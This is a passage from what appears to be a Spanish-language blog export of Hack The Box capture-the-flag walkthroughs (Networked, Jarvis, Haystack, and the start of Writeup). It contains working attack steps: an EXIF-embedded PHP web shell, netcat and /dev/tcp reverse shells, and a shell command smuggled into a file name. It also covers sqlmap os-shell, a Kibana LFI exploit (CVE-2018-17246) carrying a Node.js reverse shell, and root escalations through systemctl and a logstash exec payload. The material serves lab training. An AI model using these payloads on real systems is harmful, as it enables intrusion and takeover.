256 73💿a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Aug 27 22:49:14 2019 -- 1 IP address (1 host up) scanned in 10.16 seconds   HTTP Visitamos la pagina que se encuentra en el puerto 80 y nos muestra lo siguiente.\nAdemas de eso en el codigo fuente nos muestra un comentario relacionado a una galeria.\nDIRBUSTER Utilizamos dirbuster para busqueda de direcotrios y paginas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  root@kali:~/htb/networked# gobuster dir -u http://10.10.10.146/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -n -t 15 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.146/ [+] Threads: 15 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: txt,html,php [+] No status: true [+] Timeout: 10s =============================================================== 2019/08/27 22:46:10 Starting gobuster =============================================================== /backup /cgi-bin/ /cgi-bin/.html /index.php /index.php /lib.php /photos.php /upload.php /uploads =============================================================== 2019/08/27 22:48:15 Finished ===============================================================   BACKUP - backup.tar Visitamos la pagina backup y encontramos un archivo \u0026lsquo;backup.tar\u0026rsquo; que al extraer los archivos que contiene nos muestra el codigo fuente de las paginas que encontramos con dirbuster.\nAnalizamos el codigo fuente de los archivos, encontramos que, en la pagina upload.php podemos subir archivos de los cuales solo archivos de tipo imagen estan permitidos.\nBYPASS - Upload Shell Utilizamos exiftool para añadir codigo php para ejecucion de comandos en una de las imagenes que descargamos de photos.php, luego de esto cambiamos el nombre del archivo y le añadimos .php.jpg como extension.\n1 2  exiftool -Comment=\u0026#39;\u0026lt;?php echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\u0026#39; 127.jpg mv 127.jpg 127.php.jpg   Visitamos la pagina photos.php y nos aparece nuestra imagen/shell uploaded by 10_10_15_129.php.png.\nLe pasamos los parametros ?cmd=whoami;pwd a nuestra imagen y nos devuelve la ejecucion de comandos, un tanto desordenada con los datos de la imagen.\nLe pasamos parametros para obtener una shell inversa con netcat.\n1  nc -e /bin/bash 10.10.15.129 1337   Obtenemos nuestra shell como usuario apache.\nUSUARIO - guly Dentro de los archivos que encontramos en la carpeta principal del usuario guly, de los cuales podemos leer solo dos, vemos un archivo de tipo cronjob y uno de php.\nEl archivo cron se encarga de ejecutar el comando php /home/guly/check_attack.php cada 3 mins.\nEl segundo archivo evalua los archivos que se encuentran en /var/www/html/uploads/, si encuentra un archivo que no esta dentro de las extensiones del whitelist de lib.php lo elimina, pero lo hace con los siguientes comandos:\n1 2  exec(\u0026#34;rm -f $logpath\u0026#34;); exec(\u0026#34;nohup /bin/rm -f $path$value \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026#34;);   Las variables que nos interesan son:\n1 2  $path = \u0026#39;/var/www/html/uploads/\u0026#39;; $logpath = \u0026#39;/tmp/attack.log\u0026#39;;   Sabiendo esto vamos a aprovechar la segunda ejecucion de comandos, en la cual se le pasa los parametros:\n1  nohup /bin/rm -f $path$value \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp;   En este caso toma la variable $path donde se encuentran todos los archivos y $value el nombre del archivo a eliminar, en este caso seria de la siguiente forma /var/www/html/uploads/whatever.php, para aprovechar este comando utilizamos touch para crear el siguiente archivo (nombre):\n1  ; nc -c bash 10.10.15.129 1338   Touch Y para cuando el cron se active y ejecute el archivo y, al borrar nuestro archivo va a ejecutar lo siguiente:\n1  nohup /bin/rm -f /var/www/html/uploads/; nc -c bash 10.10.15.129 1338 \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 \u0026amp;   Por lo que va a ejecutar nuestra shell inversa y obtenemos nuestra bandera user.txt.\nPRIVILEGE ESCALATION Agregamos nuestra clave a authorized_keys del usuario guly y nos logeamos al servicio ssh. Ejecutamos el comando sudo -l -l y nos muestra un archivo que se ejecuta como usuario root.\nJail Escaping Bash Utilizamos la \u0026ldquo;tecnica\u0026rdquo; para escapar de una shell bash. Para ello al preguntarnos sobre las variables le pasamos un comando el cual va a ejecutar.\nJail Escaping Bash\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  /usr/local/sbin/changename.sh #!/bin/bash -p cat \u0026gt; /etc/sysconfig/network-scripts/ifcfg-guly \u0026lt;\u0026lt; EoF DEVICE=guly0 ONBOOT=no NM_CONTROLLED=no EoF regexp=\u0026#34;^[a-zA-Z0-9_\\ /-]+$\u0026#34; for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do echo \u0026#34;interface $var:\u0026#34; read x while [[ ! $x =~ $regexp ]]; do echo \u0026#34;wrong input, try again\u0026#34; echo \u0026#34;interface $var:\u0026#34; read x done echo $var=$x \u0026gt;\u0026gt; /etc/sysconfig/network-scripts/ifcfg-guly done /sbin/ifup guly0   Antes de eso creamos un archivo el cual contiene una shell inversa, le damos permisos con el comando chmod +x archivo. Luego de eso ejecutamos el archivo con el comando sudo y le pasamos el comando bash /tmp/sh.\nPor otro lado tenemos a la escucha netcat y obtenemos una shell con el usuario root y nuestra bandera root.txt.\n","description":"","id":71,"section":"posts","tags":["linux"],"title":"Hack The Box - Networked","uri":"https://sckull.github.io/posts/networked/"},{"content":"Jarvis es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Jarvis     OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.145   Maker manulqwerty \u0026amp; Ghostpp7    MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp, version de servicio y script con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  root@sckull:~/htb/jarvis# masscan -p1-65535,U:1-65535 10.10.10.143 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-07-06 09:51:52 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.143 Discovered open port 64999/tcp on 10.10.10.143 Discovered open port 22/tcp on 10.10.10.143 # Nmap 7.70 scan initiated Sat Jul 6 03:58:17 2019 as: nmap -sV -sC -p80,64999,22 -o nmap_scsvp.scan 10.10.10.143 Nmap scan report for 10.10.10.143 Host is up (0.083s latency).\tPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA) | 256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA) |_ 256 77:d4:ae:1f:b0:be:15:1f:f8💿c8:15:3a:c3:69:e1 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Stark Hotel 64999/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jul 6 03:58:33 2019 -- 1 IP address (1 host up) scanned in 16.02 seconds   HTTP - Puerto 80 Realizamos un escaneo de archivos/directorios en la pagina web con DIRB.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114  ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Thu Jul 25 15:30:40 2019 URL_BASE: http://10.10.10.143/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://10.10.10.143/ ---- ==\u0026gt; DIRECTORY: http://10.10.10.143/css/ ==\u0026gt; DIRECTORY: http://10.10.10.143/fonts/ ==\u0026gt; DIRECTORY: http://10.10.10.143/images/ + http://10.10.10.143/index.php (CODE:200|SIZE:23628) ==\u0026gt; DIRECTORY: http://10.10.10.143/js/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/ + http://10.10.10.143/server-status (CODE:403|SIZE:300) ---- Entering directory: http://10.10.10.143/css/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/fonts/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/images/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/js/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/ ---- + http://10.10.10.143/phpmyadmin/ChangeLog (CODE:200|SIZE:19186) ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/doc/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/examples/ + http://10.10.10.143/phpmyadmin/favicon.ico (CODE:200|SIZE:22486) + http://10.10.10.143/phpmyadmin/index.php (CODE:200|SIZE:15211) ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/js/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/libraries/ + http://10.10.10.143/phpmyadmin/LICENSE (CODE:200|SIZE:18092) ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/locale/ + http://10.10.10.143/phpmyadmin/phpinfo.php (CODE:200|SIZE:15215) + http://10.10.10.143/phpmyadmin/README (CODE:200|SIZE:1520) + http://10.10.10.143/phpmyadmin/robots.txt (CODE:200|SIZE:26) ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/setup/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/sql/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/templates/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/themes/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/tmp/ ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/vendor/ ---- Entering directory: http://10.10.10.143/phpmyadmin/doc/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/examples/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/js/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/libraries/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/locale/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/setup/ ---- ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/setup/frames/ + http://10.10.10.143/phpmyadmin/setup/index.php (CODE:200|SIZE:10541) ==\u0026gt; DIRECTORY: http://10.10.10.143/phpmyadmin/setup/lib/ ---- Entering directory: http://10.10.10.143/phpmyadmin/sql/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/templates/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/themes/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/tmp/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/vendor/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/setup/frames/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://10.10.10.143/phpmyadmin/setup/lib/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ----------------- END_TIME: Thu Jul 25 16:38:46 2019 DOWNLOADED: 13836 - FOUND: 10   Encontramos un panel de administracion de phpmyadmin, al intentar ingresar con credenciales por default no fue posible.\nSQLi Realizamos una busqueda de vulnerabilidades dentro de la pagina web viendo sus parametros en urls y encontramos que en la pagina rooms se encuentra una vulnerabilidad de tipo sql injection.\n1  http://supersecurehotel.htb/room.php?cod=1   Utilizamos sqlmap para poder explotar esta vulnerabilidad y encontramos distintas bases de datos.\nSQLMAP Dentro de las bases de datos que encontramos no vimos nada que pudiese ayudar a obtener acceso a la maquina.\n1 2 3 4 5 6 7 8 9 10  sqlmap -u \u0026#34;10.10.10.143/room.php?cod=1\u0026#34; --dbs --batch available databases [7]: [*] etgkt [*] hotel [*] information_schema [*] mysql [*] performance_schema [*] secret [*] test   SQLMAP - OS-SHELL Utilizamos el parametro de sqlmap que nos devuelve una shell, en la cual podemos ejecutar comandos del sistema.\n1  sqlmap -u \u0026#34;10.10.10.143/room.php?cod=1\u0026#34; --os-shell   Obtenemos una shell con el usuario www-data:\nPara obtener una shell inversa creamos un archivo llamado shell.sh, configuramos un servidor con python y con la shell de sqlmap descargamos el archivo y lo ejecutamos.\n1  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.174 7878 \u0026gt;/tmp/f   Shell inversa:\nShell - Pepper Enumeramos un poco el sistema y encontramos un script con el comando sudo -l -l, dicho archivo puede ser ejecutado por cualquier usuario con el comando sudo -u pepper ./simpler.py.\nAl analizar el codigo del archivo encontramos que al pasarle el parametro \u0026lsquo;-p\u0026rsquo; este ejecuta un ping sobre una IP que se le pasa, pero en la funcion no nos permite ejecutar un comando extra ademas de la IP que se le pasa.\n1 2 3 4 5 6 7 8  def exec_ping(): forbidden = [\u0026#39;\u0026amp;\u0026#39;,\u0026#39;;\u0026#39;,\u0026#39;-\u0026#39;,\u0026#39;`\u0026#39;,\u0026#39;||\u0026#39;,\u0026#39;|\u0026#39;,] command = input(\u0026#39;Enter an IP: \u0026#39;) for i in forbidden: if i in command: print \u0026#39;Got you\u0026#39; exit() os.system(\u0026#39;ping \u0026#39; + command)   Para poder escapar los caracteres \u0026amp;,;,-,``,||,| vamos a utilizar una variable la cual va ejecutar nuestra shell inversa, esta ultima la creamos en el directorio /tmp:\n1  nc -e /bin/bash 10.10.14.174 8989   Para obtener una shell con el usuario Pepper utilizamos los siguientes comandos, Ejecucion del script:\n1  sudo -u pepper /var/www/Admin-Utilities/simpler.py -p   Parametro cuando nos lo pida:\n1  \u0026#34;$(bash /tmp/x.sh)\u0026#34;   Obtenemos nuestra shell inversa y nuestra flag user.txt:\nYa que tenemos acceso al usuario Pepper agregamos nuestra llave publica a authorized_keys para poder ingresar mediante el servicio ssh.\nPRIVILEGE ESCALATION Realizamos una enumeracion de los archivos SUID en la maquina y encontramos /bin/systemctl.\nUtilizamos la informacion que nos proporciona GTFObins.\nUtilizamos los comandos:\n1  TF=/tmp/priv.service;echo \u0026#39;[Service]\u0026#39; \u0026gt; $TF;echo \u0026#39;Type=oneshot\u0026#39; \u0026gt;\u0026gt; $TF;echo \u0026#39;ExecStart=/bin/sh -c \u0026#34;nc -e /bin/bash 10.10.14.174 1331\u0026#34;\u0026#39; \u0026gt;\u0026gt; $TF;echo \u0026#39;[Install]\u0026#39; \u0026gt;\u0026gt; $TF;echo \u0026#39;WantedBy=multi-user.target\u0026#39; \u0026gt;\u0026gt; $TF   1  systemctl link $TF;systemctl enable --now $TF   Obtenemos una shell como usuario root y nuestra flag root.txt:\nFlag:\n","description":"","id":72,"section":"posts","tags":["linux"],"title":"Hack The Box - Jarvis","uri":"https://sckull.github.io/posts/jarvis/"},{"content":"Haystack es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Haystack     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.115   Maker JoyDragon    MASSCAN \u0026amp; NMAP## Escaneo de puertos tcp/udp y su servicio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  masscan -p1-65535,U:1-65535 10.10.10.115 --rate=1000 -e tun1 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-06-30 00:02:40 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.115 Discovered open port 80/tcp on 10.10.10.115 Discovered open port 9200/tcp on 10.10.10.115 # Nmap 7.70 scan initiated Sat Jun 29 21:50:27 2019 as: nmap -sV -sC -p 9200,22,80 -o nmap.scan -e tun1 10.10.10.115 Nmap scan report for 10.10.10.115 Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA) | 256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA) |_ 256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519) 80/tcp open http nginx 1.12.2 |_http-title: Site doesn\u0026#39;t have a title (text/html). 9200/tcp open http nginx 1.12.2 | http-methods: |_ Potentially risky methods: DELETE |_http-server-header: nginx/1.12.2 |_http-title: Site doesn\u0026#39;t have a title (application/json; charset=UTF-8). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 29 21:51:09 2019 -- 1 IP address (1 host up) scanned in 42.27 seconds   GOBUSTER - Puerto 80 Realizamos una busqueda de directorios y archivos en el puerto 80 http con gobuster.\n1 2 3  root@sckull:~/htb/haystack# gobuster -u http://10.10.10.115/ -w /usr/share/wordlists/dirb/common.txt -np -x php,txt,html -t 15 -q /index.html (Status: 200) /index.html (Status: 200)   Hint - Imagen Dentro de la imagen que se encuentra en el index del puerto 80 encontramos una cadena en base64 con lo que parece un hint.\nImagen:\nHint:\nGOBUSTER - Puerto 9200 Realizamos una busqueda de directorios y archivos en el puerto 9200 con gobuster.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  root@sckull:~/htb/haystack# gobuster -u http://10.10.10.115:9200/ -w /usr/share/wordlists/dirb/common.txt -np -x txt,html -t 15 ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.115:9200/ [+] Threads : 15 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : txt,html [+] Timeout : 10s ===================================================== 2019/06/29 19:25:40 Starting gobuster ===================================================== /_stats (Status: 200) /_template (Status: 200) /bank (Status: 200) /favicon.ico (Status: 200) /quotes (Status: 200) ===================================================== 2019/06/29 19:27:49 Finished =====================================================   Encontramos algunos directorios no muy comunes, al visitar este puerto con firefox encontramos que esta corriendo un servidor de Elasticsearch en su version 6.4.2.\nAl hacer una pequeña enumeracion encontramos 3 aliases, los cuales podemos utilizar para obtener informacion que esta almacenado en el servidor.\nEn el alias de .kibana encontramos una vulnerabilidad de LFI pero esta no afecta a este alias del servidor.\nPara obtener informacion de uno de los aliases (index) vamos a utilizar el siguiente query:\n[Elasticsearch Query](https://stackoverflow.com/questions/8829468/elasticsearch-query-to-return-all-records\nhttps://www.elastic.co/guide/en/elasticsearch/reference/current/full-text-queries.html)\n1 2 3 4 5 6 7 8 9  curl -s -X GET \u0026#34;http://10.10.10.115:9200/bank/_search\u0026#34; -H \u0026#39;Content-Type: application/json\u0026#39; -d\u0026#39; { \u0026#34;size\u0026#34;: 5, \u0026#34;query\u0026#34;: { \u0026#34;match_all\u0026#34;: {} } } \u0026#39;   El resultado del query son 5 valores que se encuentran dentro de \u0026lsquo;bank\u0026rsquo;, podemos hacer lo mismo para los demas aliases que encontramos.\nEn este caso vamos a buscar dentro del alias \u0026lsquo;quotes\u0026rsquo;, como anteriormente obtuvimos un \u0026lsquo;hint\u0026rsquo; en la imagen del index vamos a buscar en este caso la palabra \u0026ldquo;clave\u0026rdquo; dentro de este alias.\n1  curl -s -X GET http://10.10.10.115:9200/quotes/_search?q=clave | jq .   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  \u0026#34;hits\u0026#34;: { \u0026#34;total\u0026#34;: 2, \u0026#34;max_score\u0026#34;: 5.9335938, \u0026#34;hits\u0026#34;: [ { \u0026#34;_index\u0026#34;: \u0026#34;quotes\u0026#34;, \u0026#34;_type\u0026#34;: \u0026#34;quote\u0026#34;, \u0026#34;_id\u0026#34;: \u0026#34;45\u0026#34;, \u0026#34;_score\u0026#34;: 5.9335938, \u0026#34;_source\u0026#34;: { \u0026#34;quote\u0026#34;: \u0026#34;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg \u0026#34; } }, { \u0026#34;_index\u0026#34;: \u0026#34;quotes\u0026#34;, \u0026#34;_type\u0026#34;: \u0026#34;quote\u0026#34;, \u0026#34;_id\u0026#34;: \u0026#34;111\u0026#34;, \u0026#34;_score\u0026#34;: 5.3459888, \u0026#34;_source\u0026#34;: { \u0026#34;quote\u0026#34;: \u0026#34;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=\u0026#34; } } ] }   Obtenemos dos resultados, los cuales nso muestran dos mensajes con una cadena en base64, al decodificarlos obtenemos credenciales.\n1 2  user: security pass: spanish.is.key   SSH - User flag Ya que obtuvimos nuestras credenciales nos logeamos atravez del servicio ssh, obtenemos una shell y nuestra flag user.txt.\nKibana 6.4.2 Como vimos anteriormente encontramos un alias .kibana el cual no era afectado en el puerto 9200, al obtener una shell pudimos hacer una enumeracion y encontrar el archivo de configuracion en este caso kibana.yml el cual se encuentra en la carpeta /etc/kibana/.\nVemos que la configuracion de este archivo tiene otro puerto en el cual esta corriendo el \u0026lsquo;backend\u0026rsquo; de la aplicacion, pero este solo esta disponible en la maquina de manera local.\nPara poder ver lo que hay en el puerto 5601 vamos a hacer port forwarding, para traerlo localmente a nuestra maquina. Para ello utilizamos el siguiente comando:\n1  ssh -L 5601:localhost:5601 security@10.10.10.115   Verificamos con netstat que el puerto este activo en nuestra maquina:\nVisitamos el puerto de manera local y nos muestra una plataforma, en este caso la de Kibana.\nLFI - Kibana 6.4.2 Como lo dije anteriormente la version de Kibana 6.4.2 tiene una vulnerabilidad la cual permite ejecutar codigo mediante archivo javascript u obtener archivos mediante LFI, al explotar esta vulnerabilidad de LFI esta solo se ve reflejada dentro del archivo \u0026lsquo;log\u0026rsquo; de Kibana.\nExecute This\nCVE-2018-17246\nYouTube Kibana\nReverse Shell NodeJS\nUna cosa importante que debemos saber es de que, los archivos que se reflejan dentro del log son archivos a los que Kibana tiene acceso. Para obtener una shell tenemos que escribir un archivo javascript dentro de la maquina en un lugar donde el usuario Kibana tenga acceso, el codigo de la Shell Inversa es:\n1 2 3 4 5 6 7 8 9 10 11 12  (function(){ var net = require(\u0026#34;net\u0026#34;), cp = require(\u0026#34;child_process\u0026#34;), sh = cp.spawn(\u0026#34;/bin/sh\u0026#34;, []); var client = new net.Socket(); client.connect(1337, \u0026#34;10.10.14.85\u0026#34;, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application form crashing })();   Escribimos nuestra shell en /tmp/ y le dimos permisos para todos los usuarios:\nPara poder ejecutar nuestra shell inversa podemos hacer una solicitud con curl o hacerlo con firefox:\n1  curl \u0026#34;http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION\u0026amp;apis=../../../../../../.../../../../tmp/shell.js\u0026#34; -vv   Por otro lado obtuvimos nuestra shell inversa como usuario Kibana:\nPRIVILEGE ESCALATION Para obtener una shell como usuario root primero enumeramos los crons que se ejecutan con el usuario root esto lo hacemos con pspy. Al realizar esto encontramos un proceso que se ejecuta cada minuto aproximadamente. Este proceso esta relacionado con logstash la cual es una herramienta que administra los logs.\nAl realizar una enumearcion de esta herramienta encontramos dentro de /etc/logstash los archivos de configuracion de esta herramienta. Dentro de la carpeta /etc/logstash/conf.d encontramos 3 archivos los cuales se utilizan para administrar logs.\nEl primer archivo (filter.conf) contiene una expresion regular la cual es utlizada para organizar los archivos log. En el segundo archivo (input.conf) encontramos que apunta a un archivo path =\u0026gt; /opt/kibana/logstash_* el cual va ser ejecutado por el programa con cierto intervalo de tiempo. En el tercer archivo (output.conf) este ultimo ejecuta el archivo o el codigo que se encuentra en el archivo (path) input.conf.\nfilter.conf:\n1 2 3 4 5 6 7  filter { if [type] == \u0026#34;execute\u0026#34; { grok { match =\u0026gt; { \u0026#34;message\u0026#34; =\u0026gt; \u0026#34;Ejecutar\\s*comando\\s*:\\s+%{GREEDYDATA:comando}\u0026#34; } } } }   input.conf:\n1 2 3 4 5 6 7 8 9 10  input { file { path =\u0026gt; \u0026#34;/opt/kibana/logstash_*\u0026#34; start_position =\u0026gt; \u0026#34;beginning\u0026#34; sincedb_path =\u0026gt; \u0026#34;/dev/null\u0026#34; stat_interval =\u0026gt; \u0026#34;10 second\u0026#34; type =\u0026gt; \u0026#34;execute\u0026#34; mode =\u0026gt; \u0026#34;read\u0026#34; } }   output.conf:\noutput { if [type] == \u0026quot;execute\u0026quot; { stdout { codec =\u0026gt; json } exec { command =\u0026gt; \u0026quot;%{comando} \u0026amp;\u0026quot; } } } Execute Cmd on Elasticsearch\nYa que este programa es ejecutado por el usuario root cada cierto tiempo, podemos escribir como usuario Kibana en el directorio /opt/kibana/ un archivo de shell inversa, pero este archivo debe de hacer match con la expresion regular que se encuentra en el archivo filter.conf: ('match =\u0026gt; { \u0026quot;message\u0026quot; =\u0026gt; \u0026quot;Ejecutar\\s*comando\\s*:\\s+%{GREEDYDATA:comando}\u0026quot; }').\nPara poder entender un poco mas las expresiones regulares de esta herramienta podemos verlo aqui:\n[Grok Patterns](https://www.elastic.co/guide/en/logstash/current/plugins-filters-grok.html#_custom_patterns\nhttps://streamsets.com/documentation/datacollector/latest/help/datacollector/UserGuide/Apx-GrokPatterns/GrokPatterns_title.html)\nEl codigo que debemos de agregar al archivo es:\n1  Ejecutar comando : /usr/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.85/1598 0\u0026gt;\u0026amp;1   Para agregar el codigo a nuestro archivo utilizamos el siguiente comando:\n1  echo \u0026#34;Ejecutar comando : /usr/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.85/1598 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; /opt/kibana/logstash_bash   El nombre de nuestro archivo debe de llevar en su nombre logstash_ (input.conf) para que pueda ser ejecutado en nuestro caso /opt/kibana/logstash_bash. Un problema que tiene esta herramienta es la ejecucion, especificamente por el nombre ya que por alguna razon utilizar el mismo nombre de archivo genera algun problema y no se ejecuta, por lo que al agregar o cambiar el comando que se desea ejecutar se debe de crear un nuevo archivo con diferente nombre.\nPor otro lado ponemos a la escucha netcat con el puerto que le pasamos a nuestra shell inversa, esperamos un poco a que se ejecute el cron de nuevo y obtenemos una shell como usuario root y nuestra flag root.txt.\nCodigo de nuestra shelll inversa se ejecuta:\nShell, usuario root: ","description":"","id":73,"section":"posts","tags":["linux","elasticsearch","kibana 6.4.2"],"title":"Hack The Box - Haystack","uri":"https://sckull.github.io/posts/haystack/"},{"content":"Writeup es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Writeup     OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.138   Maker jkr    MASSCAN \u0026amp; NMAP## Escaneo de puertos TCP/UDP.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 